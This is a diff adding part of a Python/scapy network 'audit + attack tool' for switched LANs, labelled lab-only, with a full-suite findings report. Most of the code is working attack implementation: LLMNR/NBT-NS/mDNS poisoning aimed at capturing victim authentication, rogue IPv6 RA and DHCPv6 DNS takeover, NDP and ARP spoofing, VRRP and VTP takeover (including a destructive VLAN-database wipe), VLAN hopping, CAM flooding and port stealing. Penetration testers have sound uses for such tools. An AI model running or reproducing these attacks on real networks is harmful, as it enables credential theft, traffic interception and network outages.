+    if ev["randmac"]:
+        issues.append(("HIGH", f"CAM exhaustion fail-open: {ev['randmac']} "
+                               "random-MAC frames flooded onto the watch "
+                               "leg (hub mode)"))
+    elif wlegs:
+        resisted.append("CAM exhaustion")
+    else:
+        pending.append("CAM exhaustion traversal (no -w watch leg to "
+                       "observe flooding)")
+    if ev["offers"]:
+        issues.append(("MED", f"DHCP server answered forged-MAC discovers "
+                              f"({ev['offers']} offers) - no per-port rate "
+                              "limiting; starvation preconditions present"))
+    elif wlegs:
+        resisted.append("DHCP starvation")
+    if ev["garp"]:
+        issues.append(("MED", f"gratuitous ARP claims of {gw} traversed to "
+                              "the watch leg - no DAI/storm control"))
+    elif wlegs:
+        resisted.append("grat-ARP storm")
+    if ev["ra"]:
+        issues.append(("HIGH", "rogue IPv6 RAs traversed to the watch leg - "
+                               "no RA-Guard on this port"))
+    elif wlegs:
+        resisted.append("rogue RA injection")
+    pois_n = pois_stats["llmnr"] + pois_stats["nbns"] + pois_stats["mdns"]
+    if pois_n:
+        issues.append(("MED", f"name poisoning active: "
+                              f"{pois_stats['llmnr']} LLMNR / "
+                              f"{pois_stats['nbns']} NBT-NS / "
+                              f"{pois_stats['mdns']} mDNS queries answered "
+                              "as this host"))
+    else:
+        resisted.append("LLMNR/NBT-NS/mDNS poisoning (no queries arrived)")
+    if counters.get("dad"):
+        issues.append(("MED", f"SLAAC DAD spoofing blocked "
+                              f"{counters['dad']} tentative address(es) "
+                              "during the window - no DAD protection"))
+    if recon["dtp"]:
+        issues.append(("HIGH", f"DTP negotiation heard on this port "
+                               f"({recon['dtp']} frames) - trunk/"
+                               "VLAN-hopping surface open"))
+    else:
+        resisted.append("DTP trunk negotiation (port stayed silent)")
+    if counters.get("vrrp"):
+        pending.append(f"'show vrrp brief' - whether {counters['vrrp']} "
+                       f"prio-255 adverts stole vrid(s) "
+                       f"{', '.join(str(v) for v in vrrp_targets)}")
+    if not recon["vrrp"]:
+        skipped.append("VRRP takeover (no VRRP advertisements in recon)")
+
+    # ---- phase 3: applicable follow-up modules (bounded; every one gated
+    # on recon evidence - nothing runs 'just because')
+    console.rule("[bold magenta]phase 3/4 - applicable follow-up "
+                 "modules[/bold magenta]")
+
+    def run_module(label, desc, fn, spin=True):
+        """Bounded follow-up with a spinner; aborts never kill the suite."""
+        if spin:
+            cm = console.status(f"[magenta]{desc} ...", spinner="dots")
+        else:
+            console.print(f"  [magenta]>[/magenta] {desc}")
+            cm = contextlib.nullcontext()
+        with cm:
+            try:
+                fn()
+            except SystemExit:
+                skipped.append(f"{label} (module aborted)")
+            except Exception as e:
+                skipped.append(f"{label} ({type(e).__name__}: {e})")
+
+    def f_ghost():
+        ghost_sa = "01:80:c2:00:00:00"
+        got = {"n": 0}
+
+        def hit(p):
+            if p.haslayer(Ether) and p[Ether].src.lower() == ghost_sa:
+                got["n"] += 1
+
+        sn = AsyncSniffer(iface=wlegs, prn=hit)
+        sn.start()
+        time.sleep(0.5)
+        sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src=ghost_sa, type=0x88B5) /
+              b"GHOST-PROBE full-suite", iface=pif, count=20, inter=0.2,
+              verbose=0)
+        time.sleep(2)
+        sn.stop()
+        if got["n"]:
+            console.print(f"  [red]FAIL[/red] ghost: {got['n']}/20 "
+                          "reserved-source frames FORWARDED")
+            issues.append(("HIGH", "ghost frames: reserved group-MAC "
+                                   "SOURCE forwarded by the fabric (802.3 "
+                                   "3.2.6 violation - NAC/port-security "
+                                   "accounting bypass)"))
+        else:
+            console.print("  [green]ok[/green]  ghost: reserved-source "
+                          "frames dropped")
+            resisted.append("ghost reserved-source frames")
+
+    if wlegs:
+        run_module("ghost", "ghost: reserved-source forwarding probe",
+                   f_ghost)
+    else:
+        skipped.append("ghost (no -w watch leg to observe forwarding)")
+
+    def f_vlanhop(vlan):
+        sub = None
+        lease = srv = None
+        try:
+            sub = vlan_up(pif, vlan)
+            lease, srv = dhcp_discover_addr(sub, 12)
+        finally:
+            if sub:
+                vlan_down(sub)
+        if lease:
+            console.print(f"  [red]FAIL[/red] vlanhop: leased {lease} in "
+                          f"VLAN {vlan} from {srv}")
+            issues.append(("HIGH", f"VLAN {vlan} reachable from this port "
+                                   f"- DHCP lease {lease} from {srv} proves"
+                                   " bidirectional tagged access"))
+        else:
+            console.print(f"  [green]ok[/green]  vlanhop: VLAN {vlan} gave "
+                          "no lease")
+            resisted.append(f"VLAN {vlan} tagged hop (no DHCP lease)")
+
+    if recon["vlans"]:
+        for vlan in sorted(recon["vlans"])[:3]:
+            run_module(f"vlanhop v{vlan}", f"vlanhop: claiming VLAN {vlan} "
+                       "and asking DHCP", lambda v=vlan: f_vlanhop(v))
+    else:
+        skipped.append("vlanhop (no tagged frames in recon)")
+
+    def f_voice(vvid):
+        pm = my_mac(pif)
+        phones = [cdp_phone_frame(pm), lldp_phone_frame(pm, vvid)]
+        sendp(phones, iface=pif, count=3, inter=1, verbose=0)
+        sub = None
+        lease = srv = None
+        try:
+            sub = vlan_up(pif, vvid)
+            lease, srv = dhcp_discover_addr(sub, 12)
+            sendp(phones, iface=pif, verbose=0)
+        finally:
+            if sub:
+                vlan_down(sub)
+        if lease:
+            console.print(f"  [red]FAIL[/red] voicevlan: impersonation "
+                          f"leased {lease} in VVID {vvid}")
+            issues.append(("HIGH", f"voice VLAN {vvid} hopped via phone "
+                                   f"impersonation (lease {lease}) - VVID "
+                                   "not 802.1X-protected"))
+        else:
+            console.print(f"  [green]ok[/green]  voicevlan: VVID {vvid} "
+                          "impersonation rejected")
+            resisted.append(f"voice VLAN {vvid} hop (802.1X/MVA likely)")
+
+    if recon["cdp"].get("voice_vlan"):
+        vv = recon["cdp"]["voice_vlan"]
+        run_module(f"voicevlan v{vv}", "voicevlan: impersonating a phone "
+                   f"for VVID {vv}", lambda: f_voice(vv))
+    else:
+        skipped.append("voicevlan (no CDP/LLDP-MED voice leak)")
+
+    def f_vtp(dom, new_rev):
+        pm = my_mac(pif)
+        reqs = []
+
+        def listen(p):
+            try:
+                dp = Dot3(bytes(p))
+            except Exception:
+                return
+            if dp.haslayer(SNAP) and getattr(dp[SNAP], "OUI", 0) == 0x00000C \
+                    and dp[SNAP].code == 0x2003:
+                body = bytes(dp[SNAP].payload)
+                if len(body) > 40 and body[1] == 0x03:
+                    reqs.append(p.src)
+
+        sn = AsyncSniffer(iface=pif, prn=listen)
+        sn.start()
+        sendp(vtp_request(pm, dom), iface=pif, count=2, inter=1, verbose=0)
+        summary = vtp_summary(pm, dom, new_rev)
+        t0 = time.time()
+        while time.time() - t0 < 12:
+            sendp(summary, iface=pif, verbose=0)
+            time.sleep(1.5)
+        sn.stop()
+        uniq = sorted(set(reqs))
+        if uniq:
+            console.print(f"  [red]FAIL[/red] vtp: rev {new_rev} accepted "
+                          f"by {', '.join(uniq)}")
+            issues.append(("HIGH", f"VTP domain '{dom}' accepted hostile "
+                                   f"rev-{new_rev} summary - {len(uniq)} "
+                                   f"switch(es) ({', '.join(uniq)}) asked "
+                                   "for our VLAN db"))
+        else:
+            console.print(f"  [green]ok[/green]  vtp: rev {new_rev} summary "
+                          "drew no adv-requests")
+            resisted.append(f"VTP rev+1 takeover in '{dom}'")
+
+    if recon["vtp"] and recon.get("vtp_rev") is not None:
+        vtp_dom = sorted(recon["vtp"])[0]
+        vtp_rev = recon["vtp_rev"]
+        run_module(f"vtp '{vtp_dom}'", f"vtp: hostile rev-{vtp_rev + 1} "
+                   f"summary in '{vtp_dom}'",
+                   lambda: f_vtp(vtp_dom, vtp_rev + 1))
+    else:
+        skipped.append("vtp (no VTP domain/revision in recon)")
+
+    def f_dhcp6():
+        leases = roguedhcp6_cmd(argparse.Namespace(
+            iface=iface, dns6=None, domain=None, ra=False, time=12)) or {}
+        if leases:
+            console.print(f"  [red]FAIL[/red] roguedhcp6: {len(leases)} "
+                          "client(s) took our DNS")
+            issues.append(("HIGH", f"rogue DHCPv6 (mitm6 path): "
+                                   f"{len(leases)} client(s) accepted "
+                                   "leases naming this host as DNS"))
+        else:
+            console.print("  [green]ok[/green]  roguedhcp6: no solicits in "
+                          "window")
+            resisted.append("rogue DHCPv6 (no clients in window)")
+
+    def f_raguard():
+        pm = my_mac(iface)
+        ll = my_ll6(iface)
+        got = {"n": 0}
+
+        def own(p):
+            if p.haslayer(ICMPv6ND_RA) and p.haslayer(Ether) and \
+                    p[Ether].src.lower() == pm.lower():
+                got["n"] += 1
+
+        sn = AsyncSniffer(iface=wlegs, prn=own)
+        sn.start()
+        time.sleep(0.4)
+        ra_b = ICMPv6ND_RA(chlim=64, M=0, O=1, routerlifetime=60)
+        opts = (ICMPv6NDOptPrefixInfo(prefixlen=64, L=1, A=1,
+                                      validlifetime=300,
+                                      preferredlifetime=200,
+                                      prefix="2001:db8:deed::") /
+                ICMPv6NDOptRDNSS(lifetime=180, dns=[ll]))
+        src_opt = ICMPv6NDOptSrcLLAddr(lladdr=pm)
+        for style in ("plain", "chain", "frag"):
+            eth = Ether(src=pm, dst="33:33:00:00:00:01") / \
+                IPv6(src=ll, dst="ff02::1", hlim=255)
+            if style == "plain":
+                sendp(eth / ra_b / src_opt / opts, iface=iface, count=3,
+                      inter=1, verbose=0)
+            elif style == "chain":
+                eth[IPv6].nh = 60
+                sendp(eth / IPv6ExtHdrDestOpt(nh=58) / ra_b / src_opt /
+                      opts, iface=iface, count=3, inter=1, verbose=0)
+            else:
+                eth[IPv6].nh = 60
+                sendp(fragment6(eth / (IPv6ExtHdrDestOpt(nh=58) / ra_b /
+                                       src_opt / opts), 96),
+                      iface=iface, count=3, inter=1, verbose=0)
+        time.sleep(2)
+        sn.stop()
+        if got["n"]:
+            console.print(f"  [red]FAIL[/red] raguard: {got['n']} rogue RAs "
+                          "reached the watch leg")
+            issues.append(("HIGH", f"RA-Guard bypass: {got['n']} rogue RAs "
+                                   "(plain/DestOpt-chained/fragmented) "
+                                   "reached the watch leg"))
+        else:
+            console.print("  [green]ok[/green]  raguard: all evasion probes "
+                          "filtered")
+            resisted.append("RA-Guard evasion probes (plain/chain/frag)")
+
+    if recon.get("ra6"):
+        run_module("roguedhcp6", "roguedhcp6: racing solicits for 12s",
+                   f_dhcp6, spin=False)
+        if wlegs:
+            run_module("raguard", "raguard: plain/chained/fragmented RA "
+                       "evasion probes", f_raguard)
+        else:
+            skipped.append("raguard (no -w watch leg to observe "
+                           "traversal)")
+    else:
+        skipped.append("roguedhcp6 / raguard / daddos (no IPv6/RA "
+                       "traffic in recon)")
+
+    if recon["mvrp"]:
+        vlist = ",".join(str(v) for v in sorted(recon["vlans"])) or "1"
+
+        def f_mvrp():
+            mvrp_cmd(argparse.Namespace(iface=iface, vlans=vlist,
+                                        join=True, count=5, interval=1))
+            console.print(f"  [yellow]..[/yellow] mvrp: JoinIn sent for "
+                          f"VLAN(s) {vlist} - verdict needs the switch CLI")
+            pending.append("'show mvrp' / dynamic VLAN state (JoinIn sent "
+                           f"for VLAN(s) {vlist})")
+
+        run_module("mvrp", f"mvrp: JoinIn for VLAN(s) {vlist}", f_mvrp,
+                   spin=False)
+    else:
+        skipped.append("mvrp (no MVRP frames in recon)")
+
+    def f_steal(victim):
+        cap = portsteal_cmd(argparse.Namespace(
+            iface=iface, victim=victim, victim_mac=None, rate=30,
+            steal_time=0.6, duration=3, relay=False)) or 0
+        if cap:
+            console.print(f"  [red]FAIL[/red] portsteal: {cap} victim-"
+                          f"destined frames captured vs {victim}")
+            issues.append(("HIGH", f"port stealing vs {victim}: {cap} "
+                                   "victim-destined frames captured - "
+                                   "port-security/sticky-MAC not enforced"))
+        else:
+            console.print(f"  [green]ok[/green]  portsteal: no capture vs "
+                          f"{victim}")
+            resisted.append(f"port stealing vs {victim}")
+
+    if not args.no_spoof and spoof_targets:
+        vic = spoof_targets[0]
+        run_module(f"portsteal {vic}", "portsteal: racing the CAM entry "
+                   f"of {vic}", lambda: f_steal(vic), spin=False)
+    else:
+        skipped.append("portsteal (no victim host resolved)")
+
+    pending.append("'show spanning-tree root detail' + per-port "
+                   "Root/BPDU Guard state")
+    pending.append("CAM-table fill level vs the flood volume sent")
+    pending.append("DHCP lease-pool utilization after the starve window")
+    pending.append("IPv6 neighbor tables (rogue-RA / DAD residue)")
+    console.rule("[bold green]phase 4/4 - report[/bold green]")
+    if issues:
+        sev_style = {"HIGH": "bold red", "MED": "yellow", "INFO": "cyan"}
+        rank = {"HIGH": 0, "MED": 1, "INFO": 2}
+        tbl = Table(title="CONFIRMED ISSUES", title_style="bold red",
+                    header_style="bold", show_lines=True)
+        tbl.add_column("sev", no_wrap=True)
+        tbl.add_column("finding")
+        for sev, msg in sorted(issues, key=lambda x: rank.get(x[0], 3)):
+            tbl.add_row(Text(sev, style=sev_style.get(sev, "")), msg)
+        console.print(tbl)
+    else:
+        console.print("[green]no issues demonstrated in this window - "
+                      "controls on both legs held[/green]")
+    if resisted:
+        console.print(f"[dim]held (no effect demonstrated): "
+                      f"{'; '.join(resisted)}[/dim]")
+    if skipped:
+        console.print(f"[dim]skipped (not applicable): "
+                      f"{'; '.join(skipped)}[/dim]")
+    if pending:
+        console.print("[dim]verify on the switches:[/dim]")
+        for item in pending:
+            console.print(f"  [dim]-[/dim] {item}")
+
+
+# ---------------------------------------------------------------- gratarp
+
+
+def gratarp_cmd(args):
+    need_root()
+    iface = args.iface
+    m = my_mac(iface)
+    p = Ether(dst="ff:ff:ff:ff:ff:ff", src=m) / \
+        ARP(op=2, psrc=args.ip, hwsrc=m, pdst=args.ip,
+            hwdst="ff:ff:ff:ff:ff:ff")
+    print(f"[*] gratuitous ARP storm on {iface}: {args.ip} is-at {m}; "
+          "Ctrl-C to stop")
+    try:
+        while True:
+            sendp(p, iface=iface, verbose=0)
+            time.sleep(args.interval)
+    except KeyboardInterrupt:
+        print("\n[*] stopped")
+
+# ---------------------------------------------------------------- llmnr
+
+
+def make_poisoner(iface, myip, ll6, stats):
+    """Return a prn() that poisons LLMNR/NBT-NS/mDNS queries with our IP."""
+    m = my_mac(iface)
+
+    def dns_a(p, dns, kind):
+        qname = dns[DNSQR].qname
+        qtype = dns[DNSQR].qtype
+        if qtype == 28:
+            rr = DNSRR(rrname=qname, type="AAAA", ttl=30, rdata=ll6)
+        else:
+            rr = DNSRR(rrname=qname, type="A", ttl=30, rdata=myip)
+        sendp(Ether(src=m, dst=p[Ether].src) /
+              IP(src=myip, dst=p[IP].src) /
+              UDP(sport=p[UDP].dport, dport=p[UDP].sport) /
+              DNS(id=dns.id, qr=1, aa=1, qd=dns.qd, an=rr),
+              iface=iface, verbose=0)
+        stats[kind] += 1
+        print(f"      [{kind}] {qname.decode(errors='replace').rstrip('.')} "
+              f"from {p[IP].src} -> {'AAAA ' if qtype == 28 else ''}{myip}")
+
+    def nbns_a(p):
+        hdr = p[NBNSHeader]
+        req = p[NBNSQueryRequest]
+        sendp(Ether(src=m, dst=p[Ether].src) /
+              IP(src=myip, dst=p[IP].src) /
+              UDP(sport=137, dport=p[UDP].sport) /
+              NBNSHeader(NAME_TRN_ID=hdr.NAME_TRN_ID, RESPONSE=1,
+                         QDCOUNT=0, ANCOUNT=1) /
+              NBNSQueryResponse(RR_NAME=req.QUESTION_NAME,
+                                SUFFIX=req.SUFFIX,
+                                QUESTION_TYPE=0x0020,
+                                QUESTION_CLASS=0x0001,
+                                TTL=300, ADDR_ENTRY=[myip]),
+              iface=iface, verbose=0)
+        stats["nbns"] += 1
+        print(f"      [nbns] NBT-NS query from {p[IP].src} -> {myip}")
+
+    def pois(p):
+        if not (p.haslayer(UDP) and p.haslayer(IP) and p.haslayer(Ether)):
+            return
+        if p[IP].src == myip:
+            return
+        dport = p[UDP].dport
+        if dport in (5355, 5353):
+            # scapy does not auto-bind DNS to 5355/5353 -> parse raw
+            try:
+                dns = DNS(bytes(p[UDP].payload))
+            except Exception:
+                return
+            if dns.qr == 0 and dns.qd and dns[DNSQR].qtype in (1, 28):
+                dns_a(p, dns, "llmnr" if dport == 5355 else "mdns")
+        elif dport == 137 and p.haslayer(NBNSQueryRequest) and \
+                p[NBNSHeader].RESPONSE == 0:
+            nbns_a(p)
+
+    return pois
+
+
+def llmnr_cmd(args):
+    need_root()
+    iface = args.iface
+    myip = my_ip(iface)
+    ll6 = my_ll6(iface)
+    stats = {"llmnr": 0, "nbns": 0, "mdns": 0}
+    print(f"[*] LLMNR/NBT-NS/mDNS poisoner on {iface} answering as {myip}"
+          f" / {ll6}")
+    print("    victims on DNS-miss will send auth (SMB/HTTP) to us - "
+          "combine with capture tools")
+    try:
+        sniff(iface=iface,
+              filter="udp port 5355 or udp port 5353 or udp port 137",
+              timeout=args.time or None,
+              store=False, prn=make_poisoner(iface, myip, ll6, stats))
+    except KeyboardInterrupt:
+        pass
+    print(f"[*] poisoned: {stats['llmnr']} LLMNR, {stats['nbns']} NBT-NS, "
+          f"{stats['mdns']} mDNS")
+
+
+# ---------------------------------------------------------------- roguera
+
+
+def ra_frame(m, ll, rdns, prefix, lifetime):
+    return (Ether(src=m, dst="33:33:00:00:00:01") /
+            IPv6(src=ll, dst="ff02::1", hlim=255) /
+            ICMPv6ND_RA(chlim=64, M=0, O=1, prf=1, routerlifetime=lifetime) /
+            ICMPv6NDOptSrcLLAddr(lladdr=m) /
+            ICMPv6NDOptPrefixInfo(prefixlen=64, L=1, A=1,
+                                  validlifetime=86400,
+                                  preferredlifetime=14400,
+                                  prefix=prefix) /
+            ICMPv6NDOptRDNSS(lifetime=lifetime * 3, dns=[rdns]))
+
+
+def roguera_cmd(args):
+    need_root()
+    iface = args.iface
+    m = my_mac(iface)
+    ll = my_ll6(iface)
+    rdns = args.rdns or ll
+    print(f"[*] rogue IPv6 RA on {iface}: gw={ll} dns={rdns} "
+          f"prefix={args.prefix}/64 every {args.interval}s")
+    print("    dual-stack victims will install route+DNS via us")
+    f = ra_frame(m, ll, rdns, args.prefix, args.lifetime)
+    try:
+        while True:
+            sendp(f, iface=iface, verbose=0)
+            time.sleep(args.interval)
+    except KeyboardInterrupt:
+        print("\n[*] stopped")
+
+
+# ---------------------------------------------------------------- ndpspoof
+
+
+def ndpspoof_cmd(args):
+    need_root()
+    iface = args.iface
+    m = my_mac(iface)
+    gw6 = args.gw
+    if not gw6:
+        gw4 = gateway_of(iface) or "172.16.0.1"
+        gw4m = resolve_mac(gw4, iface)
+        if not gw4m:
+            die("cannot resolve gateway MAC; pass --gw <link-local>")
+        gw6 = ll6_from_mac(gw4m)
+        print(f"[*] derived gateway link-local {gw6} from {gw4} ({gw4m})")
+    pois = Ether(src=m, dst="33:33:00:00:00:01") / \
+        IPv6(src=gw6, dst="ff02::1", hlim=255) / \
+        ICMPv6ND_NA(R=0, S=0, O=1, tgt=gw6) / \
+        ICMPv6NDOptDstLLAddr(lladdr=m)
+    frames = [pois]
+    tlist = args.targets or []
+    if tlist and args.gw_mac:
+        for t in tlist:
+            frames.append(Ether(src=m, dst=args.gw_mac) /
+                          IPv6(src=t, dst=gw6, hlim=255) /
+                          ICMPv6ND_NA(R=0, S=0, O=1, tgt=t) /
+                          ICMPv6NDOptDstLLAddr(lladdr=m))
+    print(f"[*] NDP poison on {iface}: '{gw6} is-at {m}' to all nodes"
+          + (f" + gw-side for {len(tlist)} victims" if len(frames) > 1 else ""))
+    try:
+        while True:
+            sendp(frames, iface=iface, verbose=0)
+            time.sleep(args.interval)
+    except KeyboardInterrupt:
+        print("\n[*] stopped (victim caches recover via NUD)")
+
+
+# ---------------------------------------------------------------- vrrp
+
+
+def vrrp_frame(m, myip, vrid, priority, vips, adv=1):
+    return (Ether(src=m, dst="01:00:5e:00:00:12") /
+            IP(src=myip, dst="224.0.0.18", ttl=255) /
+            VRRP(version=2, type=1, vrid=vrid, priority=priority,
+                 ipcount=len(vips), adv=adv, addrlist=vips))
+
+
+def vrrp_cmd(args):
+    need_root()
+    if not HAVE_VRRP:
+        die("scapy VRRP layer unavailable")
+    iface = args.iface
+    f = vrrp_frame(my_mac(iface), my_ip(iface), args.vrid, args.priority,
+                   args.vip)
+    print(f"[*] VRRP takeover on {iface}: vrid {args.vrid} prio "
+          f"{args.priority} vip(s) {', '.join(args.vip)}")
+    try:
+        while True:
+            sendp(f, iface=iface, verbose=0)
+            time.sleep(args.interval)
+    except KeyboardInterrupt:
+        print("\n[*] stopped (real master resumes)")
+
+
+# ---------------------------------------------------------------- main
+
+
+def main():
+    ap = argparse.ArgumentParser(
+        prog="l2l3-audit",
+        description="L2/L3 security audit + attack tool (isolated lab only). "
+                    "Attack leg: eth0 (-i). Watch leg: OPTIONAL second link "
+                    "(-w, used by scan/full/ghost). No VLAN is assumed - "
+                    "scan auto-probes candidates regardless of tagging. "
+                    "Needs root: sudo l2l3-audit <cmd>. "
+                    "No subcommand = full suite (recon + all attacks).")
+    ap.add_argument("-i", "--iface", default="eth0",
+                    help="attack interface (default eth0, untagged - no VLAN "
+                         "is assumed; pass an IFACE.VLAN subinterface or use "
+                         "vlanhop to operate inside a tagged VLAN)")
+    ap.add_argument("-w", "--watch", default=None,
+                    help="OPTIONAL watch interface (second link) for "
+                         "traversal evidence in scan/full/ghost; omitted "
+                         "= single-leg operation")
+    sub = ap.add_subparsers(dest="cmd")
+
+    p = sub.add_parser("full", help="full suite: recon, all bounded attacks "
+                                    "at once, then every applicable "
+                                    "follow-up module; rich findings-only "
+                                    "report (default w/o subcommand)")
+    p.add_argument("--scan-time", type=int, default=15,
+                   help="passive scan window, seconds")
+    p.add_argument("-d", "--duration", type=int, default=30,
+                   help="attack window, seconds")
+    p.add_argument("--stp-tag", type=int, default=None,
+                   help="also attack this VLAN with tagged PVST+ BPDUs")
+    p.add_argument("--no-spoof", action="store_true",
+                   help="skip ARP poisoning of discovered hosts")
+    p.add_argument("--ra-prefix", default="fd00:dead:beef::",
+                   help="IPv6 prefix offered by the rogue RA")
+    p.set_defaults(fn=full_cmd)
+
+    p = sub.add_parser("scan", help="passive detect: STP/DTP/CDP/VTP/LLDP/"
+                                    "HSRP/VRRP/DHCP/ARP issues + active "
+                                    "VLAN probing (tagged or untagged "
+                                    "port alike)")
+    p.add_argument("-t", "--time", type=int, default=35)
+    p.add_argument("--no-probe", action="store_true",
+                   help="stay passive; skip active VLAN probing")
+    p.add_argument("--probe-vlans", default=None, metavar="ID[,A-B]",
+                   help="candidate VLANs to probe (default: common ids + "
+                        "everything leaked passively)")
+    p.add_argument("--probe-time", type=int, default=6,
+                   help="active-probe reply window, seconds")
+    p.set_defaults(fn=scan_cmd)
+
+    p = sub.add_parser("arpsweep", help="ARP host discovery")
+    p.add_argument("--net", default=None, help="CIDR, default 172.16.0.0/24")
+    p.add_argument("--timeout", type=int, default=2)
+    p.set_defaults(fn=arpsweep_cmd)
+
+    p = sub.add_parser("arpspoof", help="ARP poison target<->gateway (MITM)")
+    p.add_argument("-t", "--targets", nargs="+", default=None,
+                   help="victim IPs (default: gateway only)")
+    p.add_argument("--gateway", default=None)
+    p.set_defaults(fn=arpspoof_cmd)
+
+    p = sub.add_parser("stproot", help="claim spanning-tree root / churn topo")
+    p.add_argument("--prio", type=int, default=0, help="prio 0-255 (<<8)")
+    p.add_argument("--tag", type=int, default=None,
+                   help="also attack this VLAN with tagged PVST+ BPDUs")
+    p.add_argument("--pvst", action="store_true", default=True)
+    p.add_argument("--interval", type=float, default=0.5)
+    p.set_defaults(fn=stproot_cmd)
+
+    p = sub.add_parser("camflood", help="CAM table exhaustion (MAC flood)")
+    p.add_argument("-c", "--count", type=int, default=20000,
+                   help="frames, 0 = unlimited")
+    p.set_defaults(fn=camflood_cmd)
+
+    p = sub.add_parser("dhcpstarve", help="DHCP pool exhaustion")
+    p.add_argument("-c", "--count", type=int, default=500)
+    p.add_argument("--delay", type=float, default=0.005)
+    p.set_defaults(fn=dhcpstarve_cmd)
+
+    p = sub.add_parser("roguedhcp", help="rogue DHCP server (poisoned gw/dns)")
+    p.add_argument("--pool", default="172.16.0.150/24")
+    p.add_argument("--offer-gw", default=None, help="default: this host's IP")
+    p.add_argument("--offer-dns", default=None)
+    p.set_defaults(fn=roguedhcp_cmd)
+
+    p = sub.add_parser("dtp", help="negotiate trunk via DTP (VLAN hop "
+                                   "step 1)")
+    p.add_argument("--mode", choices=["desirable", "trunk", "auto"],
+                   default="desirable",
+                   help="trunk: pretend port already trunks (status 0x81, "
+                        "slips naive 0x03 signatures)")
+    p.add_argument("--vlans", nargs="+", type=int, default=[1, 100, 1000],
+                   help="VLANs to try subinterfaces for next (vlanhop)")
+    p.add_argument("--restore", action="store_true",
+                   help="send DTP access frames on Ctrl-C (undo trunk)")
+    p.add_argument("--interval", type=float, default=30)
+    p.set_defaults(fn=dtp_cmd)
+
+    p = sub.add_parser("doubletag", help="802.1Q double-tagging VLAN hop "
+                                         "(one-way, native-VLAN outer tag)")
+    p.add_argument("--vlan", type=int, required=True, help="target VLAN")
+    p.add_argument("--outer", type=int, default=1, help="native VLAN")
+    p.add_argument("--target", required=True)
+    p.add_argument("--dst-mac", default="ff:ff:ff:ff:ff:ff",
+                   help="target next-hop MAC (default broadcast)")
+    p.add_argument("--outer-tpid", type=lambda x: int(x, 0), default=0x8100,
+                   help="0x8100 classic | 0x88a8 QinQ S-tag confusion | "
+                        "0x9100 vendor-legacy")
+    p.add_argument("--prio", type=int, default=0, help="CoS/PCP (0-7)")
+    p.add_argument("--probe", choices=["icmp", "arp", "udp"],
+                   default="icmp")
+    p.add_argument("--port", type=int, default=9)
+    p.add_argument("-c", "--count", type=int, default=25)
+    p.add_argument("--interval", type=float, default=0.2)
+    p.set_defaults(fn=doubletag_cmd)
+
+    p = sub.add_parser("vlanenum", help="tagged-VLAN discovery: passive "
+                                        "leaks (tags/CDP/VTP/PVST+/DTP) + "
+                                        "active tagged DHCP probes")
+    p.add_argument("-t", "--time", type=int, default=20)
+    p.add_argument("--active", nargs="?", const="",
+                   help="tagged probes; no value = use leaked candidates, "
+                        "else '1,10-30,1000'")
+    p.add_argument("--probe-window", type=int, default=8)
+    p.set_defaults(fn=vlanenum_cmd)
+
+    p = sub.add_parser("vlanhop", help="hijack a tagged VLAN: bring up "
+                                       "IFACE.<vlan>, DHCP/static IP, in-"
+                                       "VLAN sweep, optional MITM, teardown")
+    p.add_argument("--vlan", type=int, required=True)
+    p.add_argument("--static", default=None, help="ip/bits instead of DHCP")
+    p.add_argument("--gateway", default=None)
+    p.add_argument("--sweep", action="store_true",
+                   help="ARP-sweep the learned subnet")
+    p.add_argument("--mitm", action="store_true",
+                   help="ARP-poison discovered hosts <-> gw (restored on "
+                        "Ctrl-C)")
+    p.add_argument("--max", type=int, default=64,
+                   help="max MITM targets")
+    p.add_argument("--dhcp-timeout", type=int, default=15)
+    p.add_argument("--persist", action="store_true",
+                   help="leave subinterface up on exit")
+    p.set_defaults(fn=vlanhop_cmd)
+
+    p = sub.add_parser("voicevlan", help="voice-VLAN abuse: VVID leak "
+                                         "discovery, phone impersonation "
+                                         "(CDP/LLDP-MED), hop, lease-proof, "
+                                         "release")
+    p.add_argument("--vvid", type=int, default=None,
+                   help="skip discovery; voice VLAN id")
+    p.add_argument("--proto", choices=["cdp", "lldp", "both"],
+                   default="both")
+    p.add_argument("-t", "--time", type=int, default=65)
+    p.add_argument("--hold", type=int, default=20,
+                   help="seconds to hold the hop before release")
+    p.add_argument("--dhcp-timeout", type=int, default=15)
+    p.add_argument("--persist", action="store_true")
+    p.set_defaults(fn=voicevlan_cmd)
+
+    p = sub.add_parser("portsteal",
+                       help="steal a victim's CAM-table entry (dual-NIC "
+                            "or :: relay-free MITM; proves missing "
+                            "port-security/sticky-MAC)")
+    p.add_argument("--victim", default=None, help="victim IP (MAC via ARP)")
+    p.add_argument("--victim-mac", default=None)
+    p.add_argument("--rate", type=int, default=25, help="steal frames/sec")
+    p.add_argument("--steal-time", type=float, default=0.7,
+                   help="steal burst per cycle, s")
+    p.add_argument("-d", "--duration", type=int, default=20, help="cycles")
+    p.add_argument("--relay", action="store_true",
+                   help="best-effort forward captured frames to victim "
+                        "(race windows)")
+    p.set_defaults(fn=portsteal_cmd)
+
+    p = sub.add_parser("ghost",
+                       help="ghost frames: reserved group MAC as SOURCE -> "
+                            "forward-but-never-learn proof (vs 802.3 3.2.6)")
+    p.add_argument("--ghost-sa", default="01:80:c2:00:00:00")
+    p.add_argument("--traverse", action="store_true",
+                   help="reserved-dst traversal probes (worst-prio STP + "
+                        "LLDP -0E) instead")
+    p.add_argument("--vlan", type=int, default=None,
+                   help="802.1Q-tag the ghost frame (ghost VLAN variant)")
+    p.add_argument("--sentinel", default="l2l3-audit")
+    p.add_argument("-c", "--count", type=int, default=30)
+    p.add_argument("--rate", type=float, default=2.0)
+    p.set_defaults(fn=ghost_cmd)
+
+    p = sub.add_parser("vtp", help="VTP takeover: rev+1 summary, listen for "
+                                   "adv-requests = acceptance proof; "
+                                   "--wipe/--set (--i-know) = destructive")
+    p.add_argument("--domain", default=None, help="VTP domain (sniff if "
+                                                  "omitted)")
+    p.add_argument("--rev", type=int, default=None,
+                   help="summary revision (default sniffed+1)")
+    p.add_argument("-t", "--time", type=int, default=20)
+    p.add_argument("--wipe", action="store_true",
+                   help="answer requests with an EMPTY VLAN db (destructive)")
+    p.add_argument("--set", nargs="+", default=None, metavar="ID[:NAME]",
+                   help="answer requests with this VLAN db (destructive), "
+                        "e.g. 1:default 999:pwned")
+    p.add_argument("--i-know", action="store_true",
+                   help="enable destructive modes (lab only)")
+    p.set_defaults(fn=vtp_cmd)
+
+    p = sub.add_parser("roguedhcp6", help="rogue DHCPv6 (mitm6): DNS "
+                                          "takeover via option 23, self-"
+                                          "expiring 300s fe80:: leases")
+    p.add_argument("--dns6", default=None,
+                   help="DNS server to push (default our link-local)")
